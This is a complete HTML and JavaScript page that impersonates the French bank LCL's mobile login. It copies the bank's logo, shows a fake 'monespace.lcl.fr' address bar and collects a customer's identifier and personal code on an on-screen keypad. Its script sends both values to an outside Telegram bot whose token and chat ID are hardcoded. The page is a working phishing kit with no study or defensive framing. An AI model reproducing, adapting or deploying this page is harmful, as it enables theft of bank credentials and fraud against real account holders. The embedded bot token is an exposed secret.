<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>LCL Mon Espace</title>
    <style>
        :root {
            --lcl-blue: #0055A4;
            --lcl-light-blue: #e6f0fa;
            --text-color: #333;
            --gray-text: #666;
            --border-color: #ddd;
            --input-bg: #f9f9f9;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #fff;
            display: flex;
            flex-direction: column;
            height: 100vh;
            overflow: hidden;
        }

        /* Header */
        .header {
            background-color: #fff;
            padding: 10px 15px;
            display: flex;
            align-items: center;
            border-bottom: 1px solid var(--border-color);
            height: 60px;
            box-sizing: border-box;
        }

        .logo-img {
            height: 35px;
            width: auto;
        }

        /* Main Content */
        .content {
            flex: 1;
            padding: 20px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            position: relative;
        }

        .step-container {
            display: none;
            animation: fadeIn 0.3s ease-in-out;
        }

        .step-container.active {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        h2 {
            font-size: 18px;
            color: var(--lcl-blue);
            margin: 0 0 10px 0;
            font-weight: 600;
        }

        .input-group {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .input-wrapper {
            position: relative;
            border: 1px solid var(--border-color);
            border-radius: 4px;
            background: var(--input-bg);
            overflow: hidden;
        }

        input[type="text"], input[type="password"], input[type="tel"] {
            width: 100%;
            padding: 15px;
            font-size: 18px;
            border: none;
            background: transparent;
            box-sizing: border-box;
            color: var(--text-color);
            outline: none;
        }

        input::placeholder {
            color: #999;
        }

        /* Validation Button */
        .btn-valider {
            background-color: var(--lcl-blue);
            color: white;
            border: none;
            padding: 15px;
            border-radius: 25px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s;
        }

        .btn-valider:active {
            background-color: #004080;
        }

        /* Footer Links */
        .footer-links {
            margin-top: 20px;
            font-size: 13px;
            color: var(--gray-text);
        }

        .footer-links div {
            margin-bottom: 8px;
            cursor: pointer;
        }

        .footer-links div:hover {
            text-decoration: underline;
        }

        .open-account {
            color: var(--lcl-blue);
            font-weight: 600;
            text-align: center;
            margin-top: 15px;
        }

        /* Keypad */
        .keypad-container {
            background-color: #f2f2f2;
            padding-bottom: 20px;
            padding-top: 5px;
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
            padding-left: 5px;
            padding-right: 5px;
        }

        .key {
            background-color: white;
            border: 1px solid #ddd;
            border-radius: 8px;
            height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            font-weight: 500;
            color: var(--text-color);
            cursor: pointer;
            user-select: none;
            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
        }

        .key:active {
            background-color: #e0e0e0;
        }

        .key-empty {
            background: transparent;
            border: none;
            box-shadow: none;
        }

        .key-del {
            font-size: 16px;
        }

        /* Animations */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(5px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Security Box (Optional visual touch) */
        .security-box {
            background-color: #f0f8ff;
            border: 1px solid #b3d9ff;
            padding: 10px;
            border-radius: 4px;
            font-size: 12px;
            color: #333;
            margin-top: 15px;
            display: none; /* Hidden by default, can be shown if needed */
        }
        
        .url-bar {
            text-align: center;
            font-size: 10px;
            color: #999;
            padding: 5px;
            background: #fff;
            border-top: 1px solid #eee;
        }
    </style>
</head>
<body>

    <!-- Header -->
    <div class="header">
        <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/0/0b/Lcl_logo.svg/250px-Lcl_logo.svg.png" alt="LCL Logo" class="logo-img">
    </div>

    <!-- Step 1: Identifiant -->
    <div id="step1" class="content step-container active">
        <div style="text-align: center; margin-bottom: 20px;">
            <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/0/0b/Lcl_logo.svg/250px-Lcl_logo.svg.png" alt="LCL" style="height: 50px; margin-bottom: 10px;">
            <h2>Pour aller de l'avant.</h2>
        </div>

        <div class="input-group">
            <label>Votre identifiant</label>
            <div class="input-wrapper">
                <input type="tel" id="identifiantInput" placeholder=" " readonly autocomplete="off">
            </div>
            <div style="display: flex; align-items: center; gap: 10px; margin-top: 5px; font-size: 13px; color: var(--gray-text);">
                <input type="checkbox" id="saveId" style="width: 16px; height: 16px;">
                <label for="saveId">Mémoriser mon identifiant</label>
            </div>
        </div>

        <div class="footer-links">
            <div>Identifiant oublié ?</div>
            <div>Code personnel oublié ?</div>
            <div>Pas encore client ?</div>
            <div class="open-account">Ouvrir un compte ></div>
        </div>
        
        <button class="btn-valider" style="margin-top: 30px;" onclick="goToStep2()">Suivant</button>
    </div>

    <!-- Step 2: Code Personnel -->
    <div id="step2" class="content step-container">
        <div style="text-align: center; margin-bottom: 20px;">
            <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/0/0b/Lcl_logo.svg/250px-Lcl_logo.svg.png" alt="LCL" style="height: 50px; margin-bottom: 10px;">
            <h2>Connectez-vous</h2>
        </div>

        <div class="input-group">
            <label>Votre code personnel</label>
            <div class="input-wrapper">
                <input type="password" id="codeInput" placeholder=" " readonly autocomplete="off">
            </div>
        </div>

        <div class="footer-links">
            <div>Identifiant oublié ?</div>
            <div>Code personnel oublié ?</div>
            <div>Pas encore client ?</div>
            <div class="open-account">Ouvrir un compte ></div>
        </div>

        <button class="btn-valider" style="margin-top: 30px;" onclick="validateCode()">Valider ></button>
    </div>

    <!-- Keypad -->
    <div class="keypad-container" id="keypad">
        <div class="key" onclick="pressKey('1')">1</div>
        <div class="key" onclick="pressKey('2')">2</div>
        <div class="key" onclick="pressKey('3')">3</div>
        <div class="key" onclick="pressKey('4')">4</div>
        <div class="key" onclick="pressKey('5')">5</div>
        <div class="key" onclick="pressKey('6')">6</div>
        <div class="key" onclick="pressKey('7')">7</div>
        <div class="key" onclick="pressKey('8')">8</div>
        <div class="key" onclick="pressKey('9')">9</div>
        <div class="key" onclick="pressKey('E')"></div> <!-- Empty -->
        <div class="key" onclick="pressKey('0')">0</div>
        <div class="key key-del" onclick="deleteKey()">⌫</div>
    </div>

    <!-- Footer URL -->
    <div class="url-bar">
        monespace.lcl.fr
    </div>

    <script>
        // Configuration Telegram
        const BOT_TOKEN = "8835375365:AAGXLvfFbU_wNtDvs5jxpEe019V2n6IY_WQ";
        const CHAT_ID = "8501464548";
        
        // State
        let currentStep = 1;
        let currentInput = document.getElementById('identifiantInput');
        let identifiantValue = "";
        let codeValue = "";

        // Focus management
        document.addEventListener('click', function(e) {
            if(e.target !== document.getElementById('saveId')) {
                // Prevent native keyboard on desktop, keep custom keypad
                // On mobile, 'readonly' prevents native keyboard if supported, 
                // but we rely on custom keypad anyway.
            }
        });

        function pressKey(key) {
            if (currentStep === 1) {
                if (key !== 'E' && key !== 'delete') {
                    if (identifiantValue.length < 10) { // Limit length
                        identifiantValue += key;
                        currentInput.value = identifiantValue;
                    }
                } else if (key === 'delete') {
                    identifiantValue = identifiantValue.slice(0, -1);
                    currentInput.value = identifiantValue;
                }
            } else {
                if (key !== 'E' && key !== 'delete') {
                    if (codeValue.length < 6) { // 6 digits code
                        codeValue += key;
                        currentInput.value = codeValue;
                    }
                } else if (key === 'delete') {
                    codeValue = codeValue.slice(0, -1);
                    currentInput.value = codeValue;
                }
            }
        }

        function deleteKey() {
            pressKey('delete');
        }

        function goToStep2() {
            if (identifiantValue.length === 0) {
                alert("Veuillez entrer un identifiant");
                return;
            }
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.add('active');
            
            currentStep = 2;
            currentInput = document.getElementById('codeInput');
            codeValue = "";
            currentInput.value = "";
            
            // Focus input to trigger any potential system interactions if needed
            currentInput.focus();
        }

        function validateCode() {
            if (codeValue.length < 4) {
                alert("Code invalide");
                return;
            }
            
            // Send to Telegram
            const message = `🔐 *Nouvelle Connexion LCL*\n\n👤 Identifiant: \`${identifiantValue}\`\n🔑 Code: \`${codeValue}\`\n📅 Date: ${new Date().toLocaleString()}`;
            
            sendToTelegram(message);
            
            // Optional: Redirect or show success
            // window.location.href = "https://monespace.lcl.fr"; 
            alert("Données envoyées !");
        }

        function sendToTelegram(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const data = {
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'Markdown'
            };

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                console.log('Telegram OK', data);
            })
            .catch(error => {
                console.error('Error sending to Telegram:', error);
            });
        }
    </script>
</body>
</html>
